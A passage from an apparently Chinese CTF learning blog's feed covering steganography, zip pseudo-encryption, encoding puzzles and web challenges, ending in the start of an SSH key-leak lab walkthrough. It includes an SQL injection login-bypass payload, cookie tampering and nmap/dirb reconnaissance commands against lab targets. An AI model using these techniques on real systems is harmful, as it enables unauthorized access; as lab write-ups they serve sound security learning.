operator">-</span><span class="token number">4</span><span class="token punctuation">)</span>    list_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span>c<span class="token punctuation">)</span>base64_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>list_str<span class="token punctuation">)</span>plain_text <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>base64_str<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>plain_text<span class="token punctuation">)</span></code></pre><p>先移位，变成base64编码，再进行解码。</p><pre class="language-bash" data-language="bash"><code class="language-bash">key<span class="token punctuation">&#123;</span>68743000650173230e4a58ee153c68e8<span class="token punctuation">&#125;</span></code></pre><p>原本是上周的，现在才写完。罪过罪过。又懒了！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF题记————第三周</title>
      <link href="/posts/ac74f749/"/>
      <url>/posts/ac74f749/</url>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="坚持60s"><a href="#坚持60s" class="headerlink" title="坚持60s"></a>坚持60s</h2><p><img src="https://img-blog.csdnimg.cn/20200329164919118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开发现是个java写的小程序好像，看了一脸懵*。<br><img src="https://img-blog.csdnimg.cn/20200329165132111.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>完全没搞懂咋玩，也不会动。一点思路都没有。<br>看wp，提到了一个java反编译的工具。没见过这种题。没见过就要记下来嘛，而且我最喜欢的就是玩这种我不知道的工具，又可以收一个。<br>jd-gui，这个工具，下载链接<a href="https://pan.baidu.com/s/1kmVFz964CP-xvMKznbolIw">jd-gui</a>提取码<code>9ggk</code><br>下载后不用解压，我分享的是文件夹。直接打开工具用（无需安装）<br>简单粗暴的方法就是直接把那个java小程序直接拖进去<br><img src="https://img-blog.csdnimg.cn/20200329165929619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到flag了，看着是base64 ，所以解下码在提交就对了。大吉大利，今晚吃鸡。</p><h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>这个好大一个压缩包，刚开始做看到webshell还以为是要蚁剑连接，结果根本就不是，又了解到一种方式，记录一下。因为不清楚这题是干什么的，然后就去查查，结果发现直接用杀毒软件查杀就行了。服辣。。。这也行？？<br><img src="https://img-blog.csdnimg.cn/20200331080214625.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后打开指定路径就找到了。害。<br><img src="https://img-blog.csdnimg.cn/20200331080704576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还有一道题，叫做后门查杀，跟这道题一样。</p><h2 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h2><p><img src="https://img-blog.csdnimg.cn/20200331123158565.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开后发现是张图片，然后就很自然的foremost分离了。<br><img src="https://img-blog.csdnimg.cn/20200331123351755.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>别说还真有东西，真分离出来了一张，但是死活找不到接下来的思路了，改高度、宽度。都试过了，全都不行。实在没办法，就找了wp结果我服辣。就直接搜索文本flag就能出来。¬_¬。来看我的<br><img src="https://img-blog.csdnimg.cn/20200331123841500.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我TM直接疑惑。(→_→)，再仔细看看wp，他们好像没有分离图片，？？？我也试试。然后还是找不到。¯(°_o)/¯，我全删了重新来了一遍。<br>(￣┰￣*)(￣┰￣*)(￣┰￣*)(→_→)这题我无语。无能为力。<br><img src="https://img-blog.csdnimg.cn/20200331124158199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>啥也不是。</p><h2 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h2><p><img src="https://img-blog.csdnimg.cn/20200331195839903.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到题捕捉信息，四位数。猜测可能是让破解压缩包密码。<br>然后打开就是这样的，<br><img src="https://img-blog.csdnimg.cn/20200331200118978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后解压看到了奇怪的东西。<br><img src="https://img-blog.csdnimg.cn/20200331200246683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>火星文？？<br>然后我就复制了几行“火星文”放到百度直接查是什么密码，筛选后发现，是一种之前没见过，叫做brainfuck,<br>然后就在线解密拿到flag<br><img src="https://img-blog.csdnimg.cn/2020033120094752.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h2><p>打开后是一张图片，然后就很自然的foremost分离出来个压缩包，然后发现有密码，先暴力破解，一分钟无果。那可能是伪加密， 打开winhex瞅瞅，搜索十六进制“504B”找了好久，一直找，快怀疑是不是又想错了，最后在“最后面”找到了伪加密的位置<br><img src="https://img-blog.csdnimg.cn/20200331204605203.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>改一下，然后打开是个flag.vmdk文件，查百度，然后要到kali进行，拖进kali，然后终端输入<code>7z x flag.vmdk的位置</code>，然后会有<br><img src="https://img-blog.csdnimg.cn/20200331212106203.png" alt="Augenstern" loading="lazy"><br>看到了上面那两个文件，打开<br>第一段是brainfuck密码，<br><img src="https://img-blog.csdnimg.cn/20200331212401755.png" alt="Augenstern" loading="lazy"><br>在线密码破解出来<br><img src="https://img-blog.csdnimg.cn/20200331212345502.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>第二段是OOK<br><img src="https://img-blog.csdnimg.cn/20200331212547902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>同样在线解密网站解出<br><img src="https://img-blog.csdnimg.cn/20200331212636750.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag拼接得到。</p><h2 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h2><p><img src="https://img-blog.csdnimg.cn/2020033122110489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>还是看见图片foremost分离，出来一个压缩包和原来的图片。但是压缩包有密码，<br><img src="https://img-blog.csdnimg.cn/20200331221311535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>是因为这个jpg图片有密码。然后打不开，导致整个压缩包都无法解压，但是可以直接拖出来那个压塑包（qwe.zip），<br>然后就可以看到里面是flag的txt文档，然后就去找那个jpg，既然给了jpg，那么那个flag.txt就肯定不是弱口令，没办法短时间爆破，放弃这种想法。<br>看jpg，分析应该是伪加密，（因为我目前也不知道有什么其他办法了），然后直接将用foremost分离出来的那个压缩包直接拖进winhex里进行查看，去后面找，因为伪加密的文件是后面的jpg，所以就要去后面找，也省时间，找到了，就改了它。<br><img src="https://img-blog.csdnimg.cn/20200331222237460.png" alt="Augenstern" loading="lazy"><br>结果改了之后，不行，发现还是没有解开伪加密，思路就断了，想了想实在找不到其他思路（因为做题少），就看了其他师傅的wp，发现我前面的的想法是没错的，只是比较出乎我的意料的就是，它伪加密的地方不止一个，这操作真没想到，改，这次改到最后，一直找504B，我也忘了改了几个，最后是解出来了，可以打开了。再次foremost，什么也没有，我又去观摩师傅们的博客了，然后我就又收获了一个工具steghide<br>kali中安装的命令</p><pre class="language-bash" data-language="bash"><code class="language-bash">root账户下<span class="token function">apt-get</span> <span class="token function">install</span> steghide 普通管理员账户<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> steghide</code></pre><p>接下来解题<br><code>steghide info 路径</code>然后就能找到有这个文件叫做ko.txt<br><img src="https://img-blog.csdnimg.cn/20200331225140446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后输入命令<code>steghide extract -sf 路径</code>在主文件夹创建了一个文件<br><img src="https://img-blog.csdnimg.cn/20200331230109296.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>打开就是………………嘿嘿，还要拖到Windows系统上才能打开，kali打不开txt文件。<br><img src="https://img-blog.csdnimg.cn/20200331230307796.png" alt="Augenstern" loading="lazy"><br>然后这个肯定就是flag.txt的密码了。<br><img src="https://img-blog.csdnimg.cn/20200331230415934.png" alt="Augenstern" loading="lazy"><br>get！！！！</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="实验吧注入关最简单的SQL注入"><a href="#实验吧注入关最简单的SQL注入" class="headerlink" title="实验吧注入关最简单的SQL注入"></a>实验吧注入关最简单的SQL注入</h2><p><img src="https://img-blog.csdnimg.cn/20200401150817582.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>发现是个表单提交的。然后题目说题目里有简单的提示，进去之后先看源码。<img src="https://img-blog.csdnimg.cn/20200401150956638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>用户要求用admin，应该是万能密码没错了。构造<code>admin&#39; or &#39;1&#39;=&#39;1#</code><br>密码随便填写，验证码填一下<br><img src="https://img-blog.csdnimg.cn/20200401151218920.png" alt="Augenstern" loading="lazy"><br>答案出来了。</p><h2 id="HAHA浏览器"><a href="#HAHA浏览器" class="headerlink" title="HAHA浏览器"></a>HAHA浏览器</h2><p><img src="https://img-blog.csdnimg.cn/20200401212713250.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>安装浏览器，，，肯定不至于。<br>抓个包，送到repeater，将浏览器改为HAHA就可以了然后Go。得到flag<br><img src="https://img-blog.csdnimg.cn/20200401214910778.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="key又找不到了"><a href="#key又找不到了" class="headerlink" title="key又找不到了"></a>key又找不到了</h2><p><img src="https://img-blog.csdnimg.cn/20200401220451712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这个一个链接点进去，让找key，<br><img src="https://img-blog.csdnimg.cn/20200401220839224.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后猜测可能是中间跳转了，之前有过这样一道题，再来一遍<br>回到初始页面复制题目链接（我在火狐抓的）<br>点击到这里找key，抓到包后，send to repeater<br>点Go<br><img src="https://img-blog.csdnimg.cn/20200401222359104.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到了信息，改一下url的信息<br>再Go<br><img src="https://img-blog.csdnimg.cn/20200401222541128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>找到key</p><h2 id="冒充用户登录"><a href="#冒充用户登录" class="headerlink" title="冒充用户登录"></a>冒充用户登录</h2><p><img src="https://img-blog.csdnimg.cn/20200401224015131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这种题点进去直接看大多数都是没什么结果，还是看一下。不出意料还是什么都没有。直接抓包<br><img src="https://img-blog.csdnimg.cn/20200401224153219.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>send to repeater,<br><img src="https://img-blog.csdnimg.cn/20200401224254975.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>看到cookie了，还有login=0.那0不行就改个1 ，Go<br><img src="https://img-blog.csdnimg.cn/20200401224415587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>拿到key</p><h2 id="就不让你访问"><a href="#就不让你访问" class="headerlink" title="就不让你访问"></a>就不让你访问</h2><p><img src="https://img-blog.csdnimg.cn/20200401232400954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我万能的抓包不管用了，，，，什么信息都没有找到。。<br>让找admin的那一页，关键是把index改成admin它也不对啊<br>想起来个已经蒙灰了的工具——御剑<br><img src="https://img-blog.csdnimg.cn/20200401233748745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>扫了半天出来个robots协议。<br>看看里面有啥吧<br><img src="https://img-blog.csdnimg.cn/20200401233901978.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>不让访问这个？？那就搞它。<br><img src="https://img-blog.csdnimg.cn/20200401234027205.png" alt="Augenstern" loading="lazy"><br>没有，，接着找？<br>login，反正也找不到其他信息，那就试试这个吧<br>在url后面加上login.php，没想到还真出来了<br><img src="https://img-blog.csdnimg.cn/20200401234157180.png" alt="Augenstern" loading="lazy"><br>拿到key。到这里，网络安全实验室的基础关就闯完了。以后可以尝试后面的了。</p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="丢失的MD5"><a href="#丢失的MD5" class="headerlink" title="丢失的MD5"></a>丢失的MD5</h2><p>打开是一个python文件，然后就放到kali里跑了一下，就出来flag了。（过程比较快，我拿手机拍下来的o((⊙﹏⊙))o.）</p><h2 id="一段base64"><a href="#一段base64" class="headerlink" title="一段base64"></a>一段base64</h2><p>这道题编码太长，在线解密工具不能用了，解不了。这就要用到一个神器就是converter。将整页的base64编码复制进输入框<br><img src="https://img-blog.csdnimg.cn/20200401083509102.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这密码真长，把我软件都给我整卡了。<br>然后复制输出到输入，再Unescape解码<br>复制输出到输入，进行Hex to Text解码<br>复制输出到输入，再次进行Unescape解码<br>然后出现了这样<br><img src="https://img-blog.csdnimg.cn/20200401084204309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里string fromCharCode是Javascript里面的函数，大括号里面是参数。<br>复制里面的参数到输入框中，进行Dec to Text解码<br>复制输出到输入，进行Decode HTML解码<br><img src="https://img-blog.csdnimg.cn/20200401084855927.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>然后找个在线解密网站进行Unicode编码转换<br><img src="https://img-blog.csdnimg.cn/20200401084948696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>flag%7Bctf_tfc201717qwe%7D<br>%7B和%7D分别表示{}<br>┏┛墓┗┓…(((m -__-)m这题也是没谁了。算了，好记性不如烂笔头。</p><h2 id="贝斯家族"><a href="#贝斯家族" class="headerlink" title="贝斯家族"></a>贝斯家族</h2><p>贝斯家族，我就知道base16、base32、base64.其他都不知道，通过这道题了解到了还有base36、base58、base62、base91、base92、base85、害，人菜起来真是自己都服，这道题就是base91。可以先自己了解下，再找在线解密网站解。<img src="https://img-blog.csdnimg.cn/20200401140138285.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="fuqiangminzhu"><a href="#fuqiangminzhu" class="headerlink" title="fuqiangminzhu"></a>fuqiangminzhu</h2><p><img src="https://img-blog.csdnimg.cn/20200401140305540.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这道题是我没见过得编码，但是找wp，找到一个在线解码的网站解出来的。<br><img src="https://img-blog.csdnimg.cn/20200401140536612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>虽然看着步骤简单，但是却是我没见过的。记录一下。</p><h2 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h2><p>这个想了好久，试了几次其他的解密方式，都不行。凯撒不对，变异凯撒也不是……栅栏，Wi型的栅栏，都不对。实在想不出来哪个加密里面有@@的。而且是明显看着没有其他的加密了，能看到第二个字母是f,只能在216534上面找了。突然想到一个没有什么套路的想法，感觉不对，还是试了试。但是抓到线索了<br><img src="https://img-blog.csdnimg.cn/20200401143102567.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这是第一次尝试，失败。。。。进行第二次……<br><img src="https://img-blog.csdnimg.cn/2020040114240459.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_QXVnZW5zdGVybg==,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>这里再用栅栏就能解密成功了。6字一栏<br>4月1日的最后时刻说一声：愚人节快乐！！！</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF题记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————SSH-私钥泄露</title>
      <link href="/posts/d77071c4/"/>
      <url>/posts/d77071c4/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这个比较好玩，玩一下。</p><h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p>ssh-私钥泄露靶机<br>kali攻击机<br>安装靶机<br><img src="https://img-blog.csdnimg.cn/20200527173134439.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后设置虚拟机的联网方式，因为是自己的靶机，不知道IP地址，所以前期工作需要安排一下。kali的网络连接方式要设置成和ssh-私钥泄露的一样。<br>因为我前段时间不知道怎么设置，所以探测不到靶机IP，导致没办法做这个实验。今天又看到它了，决定玩一下。下面给出两种设置方法，可以都尝试一下并选择适合自己配置的方法。</p><h2 id="重要设置"><a href="#重要设置" class="headerlink" title="重要设置"></a>重要设置</h2><p>一、两台虚拟机都设置成桥接，如图所示<br><img src="https://img-blog.csdnimg.cn/2020052717462014.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>两个都设置成这样。就可以等下一步去测试IP地址了。<br>不过我使用这个办法行不通，而且看了几个博客，都是这么设置的。我死活都探测不出来靶机IP。我就自己摸索到了第二个方法。适合我的。<br>二、两台虚拟机都设置成NAT连接。<br><img src="https://img-blog.csdnimg.cn/20200527174933206.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>记得改过配置后进行重启。才能生效。<br>这个我是测试过的。可以行得通。</p><h1 id="实验前需要"><a href="#实验前需要" class="headerlink" title="实验前需要"></a>实验前需要</h1><h2 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h2><p>测试靶机IP地址<br>打开kali<br>输入ifconfig查看当前IP<br>但是出了个错<br><img src="https://img-blog.csdnimg.cn/20200527175800549.png" alt="j4y" loading="lazy"><br>很无语，这个问题解决也挺简单的，就是将ifconfig加入环境变量当中<br><img src="https://img-blog.csdnimg.cn/20200527180732890.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>按照图中的步骤来，将ifconfig加入环境变量<br>主要命令</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">echo</span> <span class="token variable">$PATH</span>  <span class="token comment">#打印环境变量的内容</span>whereis ifconfig <span class="token comment"># ifconfig的位置</span></code></pre><p>探测靶机IP<br>已经查出kali攻击机的IP是<code>192.168.40.132</code><br>然后查询当前同一网段存活的IP</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">netdiscover <span class="token operator">-</span>r 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>1<span class="token operator">/</span>24</code></pre><p>普通用户加sudo<br><img src="https://img-blog.csdnimg.cn/20200527181348429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这个是靶机IP，(挨个试出来的)<br>怎么判断是不是靶机IP？<br>用nmap扫描</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">nmap <span class="token operator">-</span><span class="token function">sV</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>143</code></pre><p><img src="https://img-blog.csdnimg.cn/20200527181558476.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看到这个IP开启了ssh服务。<br>所以它就是靶机的IP。<br><code>192.168.40.143</code></p><h1 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h1><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>非常直接——拿到flag</p><h2 id="第一个flag"><a href="#第一个flag" class="headerlink" title="第一个flag"></a>第一个flag</h2><p>使用nmap进行信息扫描，查找有用信息。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">nmap <span class="token operator">-</span><span class="token function">sV</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>143</code></pre><p>发现其开启的服务有ssh和http服务。<br><img src="https://img-blog.csdnimg.cn/20200527182604429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>常用端口范围是0-1023端口，在扫描结果中查找特殊端口。<br>针对特殊端口进行探测，尤其对开发大端口的http服务进行排查。<br>看到一个不常见的端口，31337端口。是http服务的。就可以访问一下。(其他的也都是了一遍，没有发现东西)<br>访问查看<br><img src="https://img-blog.csdnimg.cn/20200527182835608.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看页面源代码，但是没有任何信息。<br><img src="https://img-blog.csdnimg.cn/20200527183531878.png" alt="j4y" loading="lazy"><br>然后使用dirb命令对这个服务的隐藏文件进行探测。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">dirb http:<span class="token operator">/</span><span class="token operator">/</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>143:31337<span class="token operator">/</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200527183843396.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看robots协议。robots协议是禁止爬虫爬取的地方。<br><img src="https://img-blog.csdnimg.cn/20200527183012731.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>挨个查看，也就三个。<br>找到了第一条flag<br><img src="https://img-blog.csdnimg.cn/20200527183208204.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h2 id="第二个flag"><a href="#第二个flag" class="headerlink" 